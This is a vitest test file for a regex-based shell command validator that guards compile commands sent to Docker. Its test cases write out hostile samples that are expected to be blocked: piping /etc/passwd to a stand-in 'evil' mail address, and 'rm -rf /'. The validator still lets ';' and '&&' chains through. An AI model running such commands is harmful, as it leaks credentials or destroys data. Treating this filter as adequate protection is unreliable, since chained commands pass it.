import { describe, it, expect } from "vitest";

// validateShellCommand is not exported, so we test it via the module's
// public behavior. However, since it's a private function in execute.ts,
// we test the observable effects: commands that pass validation are
// allowed to proceed to Docker execution, while blocked commands are
// rejected early. For unit-testing purposes, we replicate the logic
// here to verify the regex behavior directly.

function validateShellCommand(cmd: string): boolean {
  if (!cmd || cmd.length > 10_000) return false;
  if (cmd.includes("\0")) return false;
  const dangerous = /`|\$\(|\$\{|[<>]\(|\|\||\||>|<|\n|\r|\beval\b/;
  return !dangerous.test(cmd);
}

describe("validateShellCommand", () => {
  it("allows simple commands", () => {
    expect(validateShellCommand("javac Main.java")).toBe(true);
    expect(validateShellCommand("python3 main.py")).toBe(true);
    expect(validateShellCommand("g++ -o main main.cpp -lm")).toBe(true);
  });

  it("allows && chaining for multi-step compile commands", () => {
    expect(validateShellCommand("javac Main.java && jar cf app.jar *.class")).toBe(true);
    expect(validateShellCommand("gcc -c foo.c && gcc -o foo foo.o")).toBe(true);
  });

  it("allows ; separator for sequential commands", () => {
    expect(validateShellCommand("javac Main.java; echo done")).toBe(true);
    expect(validateShellCommand("cd /tmp; gcc main.c")).toBe(true);
  });

  it("rejects command substitution with backticks", () => {
    expect(validateShellCommand("echo `whoami`")).toBe(false);
  });

  it("rejects command substitution with $()", () => {
    expect(validateShellCommand("echo $(whoami)")).toBe(false);
  });

  it("rejects $() with braces", () => {
    expect(validateShellCommand("echo ${PATH}")).toBe(false);
  });

  it("rejects pipe chains", () => {
    expect(validateShellCommand("cat /etc/passwd | mail evil@ex.com")).toBe(false);
  });

  it("rejects || chains", () => {
    expect(validateShellCommand("true || rm -rf /")).toBe(false);
  });

  it("rejects output redirection", () => {
    expect(validateShellCommand("echo data > /tmp/out")).toBe(false);
    expect(validateShellCommand("echo data >> /tmp/out")).toBe(false);
  });

  it("rejects input redirection", () => {
    expect(validateShellCommand("command < /etc/passwd")).toBe(false);
  });

  it("rejects eval", () => {
    expect(validateShellCommand("eval 'rm -rf /'")).toBe(false);
  });

  it("rejects newlines in commands", () => {
    expect(validateShellCommand("echo hi\nrm -rf /")).toBe(false);
  });

  it("rejects process substitution", () => {
    expect(validateShellCommand("cat <(echo hi)")).toBe(false);
    expect(validateShellCommand("echo >(evil)")).toBe(false);
  });

  it("rejects empty strings", () => {
    expect(validateShellCommand("")).toBe(false);
  });

  it("rejects null bytes", () => {
    expect(validateShellCommand("echo\0hi")).toBe(false);
  });

  it("rejects overly long commands", () => {
    expect(validateShellCommand("a".repeat(10_001))).toBe(false);
  });

  it("allows commands at max length", () => {
    expect(validateShellCommand("a".repeat(10_000))).toBe(true);
  });
});
